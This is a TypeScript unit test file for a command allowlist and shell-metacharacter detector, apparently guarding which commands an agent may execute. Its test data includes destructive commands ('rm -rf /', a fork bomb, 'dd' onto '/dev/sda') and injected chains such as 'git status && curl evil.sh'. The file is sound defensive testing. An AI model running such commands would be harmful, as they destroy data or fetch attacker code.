/**
 * Unit tests for allowlist-pattern.ts
 *
 * @module security/exec-approvals/__tests__/allowlist-pattern
 * @sprint 132 M1
 */

import { describe, it, expect } from "vitest";
import { matchesPattern, findMatchingPattern, normalizeCommand, containsShellMetachars } from "../allowlist-pattern.js";

describe("allowlist-pattern", () => {
  describe("normalizeCommand", () => {
    it("trims leading and trailing whitespace", () => {
      expect(normalizeCommand("  git status  ")).toBe("git status");
    });

    it("collapses multiple spaces", () => {
      expect(normalizeCommand("git  log   --oneline")).toBe("git log --oneline");
    });

    it("returns unchanged for already normalized string", () => {
      expect(normalizeCommand("ls -la")).toBe("ls -la");
    });
  });

  describe("matchesPattern — exact match", () => {
    it("matches exact string", () => {
      expect(matchesPattern("git status", "git status")).toBe(true);
    });

    it("does not match prefix substring", () => {
      expect(matchesPattern("git status", "git status --short")).toBe(false);
    });

    it("does not match suffix substring", () => {
      expect(matchesPattern("git log", "long git log")).toBe(false);
    });

    it("is case-sensitive", () => {
      expect(matchesPattern("Git Status", "git status")).toBe(false);
    });
  });

  describe("matchesPattern — wildcard *", () => {
    it("matches wildcard at end", () => {
      expect(matchesPattern("git log *", "git log --oneline --graph")).toBe(true);
    });

    it("matches wildcard in middle", () => {
      expect(matchesPattern("git * main", "git push origin main")).toBe(true);
    });

    it("matches wildcard for single token", () => {
      expect(matchesPattern("ls *", "ls -la")).toBe(true);
    });

    it("wildcard matches empty suffix", () => {
      // "git log *" should match "git log " (with trailing space after normalization)
      // After normalization: "git log " → "git log" — no trailing space
      // So "git log *" with * matching empty string depends on .* behavior
      // Let's check: "git log " normalizes to "git log"
      // Pattern "git log *" → regex "^git log .*$" — requires a space after "log"
      // "git log" does NOT match "git log *" (no space + arg)
      expect(matchesPattern("git log *", "git log")).toBe(false);
    });

    it("glob star matches path with spaces", () => {
      expect(matchesPattern("cat *", "cat src/foo/bar.ts")).toBe(true);
    });

    it("multiple wildcards", () => {
      expect(matchesPattern("find * -name *", "find . -name *.ts")).toBe(true);
    });
  });

  describe("matchesPattern — hard-deny patterns", () => {
    it("matches rm -rf /", () => {
      expect(matchesPattern("rm -rf /", "rm -rf /")).toBe(true);
    });

    it("does not match rm -rf /tmp (different path)", () => {
      expect(matchesPattern("rm -rf /", "rm -rf /tmp")).toBe(false);
    });

    it("matches git push --force wildcard", () => {
      expect(matchesPattern("git push --force *", "git push --force origin")).toBe(true);
    });

    it("matches fork bomb exactly", () => {
      expect(matchesPattern(":(){ :|:& };:", ":(){ :|:& };:")).toBe(true);
    });

    it("matches dd if=* of=/dev/*", () => {
      expect(matchesPattern("dd if=* of=/dev/*", "dd if=/dev/zero of=/dev/sda")).toBe(true);
    });
  });

  describe("containsShellMetachars", () => {
    it("detects pipe", () => {
      expect(containsShellMetachars("echo foo | cat")).toBe(true);
    });

    it("detects semicolon", () => {
      expect(containsShellMetachars("pnpm test ; rm -rf ~")).toBe(true);
    });

    it("detects && chain", () => {
      expect(containsShellMetachars("git status && curl evil.sh")).toBe(true);
    });

    it("detects backtick substitution", () => {
      expect(containsShellMetachars("echo `whoami`")).toBe(true);
    });

    it("detects $() substitution", () => {
      expect(containsShellMetachars("echo $(id)")).toBe(true);
    });

    it("returns false for clean command", () => {
      expect(containsShellMetachars("pnpm test")).toBe(false);
    });

    it("returns false for git log --oneline", () => {
      expect(containsShellMetachars("git log --oneline")).toBe(false);
    });
  });

  describe("findMatchingPattern", () => {
    it("returns first matching pattern", () => {
      const patterns = ["git status", "git log *", "ls *"];
      expect(findMatchingPattern(patterns, "git log --oneline")).toBe("git log *");
    });

    it("returns null when no pattern matches", () => {
      const patterns = ["ls", "cat *"];
      expect(findMatchingPattern(patterns, "rm -rf /tmp")).toBeNull();
    });

    it("returns null for empty patterns array", () => {
      expect(findMatchingPattern([], "anything")).toBeNull();
    });

    it("skips empty patterns", () => {
      expect(findMatchingPattern(["", "  ", "git status"], "git status")).toBe("git status");
    });
  });
});
